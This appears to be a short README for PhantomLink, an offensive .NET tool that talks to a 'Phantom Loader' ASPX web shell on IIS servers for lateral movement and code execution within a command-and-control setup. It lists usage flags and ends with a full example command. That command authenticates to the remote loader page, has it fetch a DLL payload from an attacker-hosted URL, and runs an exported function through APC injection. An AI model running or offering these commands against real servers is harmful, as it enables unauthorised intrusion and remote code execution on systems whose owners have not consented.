PhantomLink is a .NET tool designed to be used in combination with the Phantom Loader (ASPX). Its primary purpose is to integrate with a Command and Control (C2) framework to perform lateral movement or code execution against IIS servers.

PhantomLink connects to a remote Phantom Loader ASPX page and triggers execution using custom injection settings and a supplied DLL payload, without requiring interactive access to the loader.

How to use? 

PhantomLink.exe -h         {print the help guide}
PhantomLink.exe  -f        {Path to DLL payload in the remote target}
PhantomLink.exe  -k        {Secret phrase }
PhantomLink.exe -wp        {web stager to fetch DLL from remote host without a need to be called locally}
PhantomLink.exe --func     {Export function name}
PhantomLink.exe --sig      {Calling signature name}


PhantomLink.exe --url http://remotehost/app/phantom.aspx -k {SECRET} -wp http://attackersite/mydll.dll --func Run --sig apc_execute 

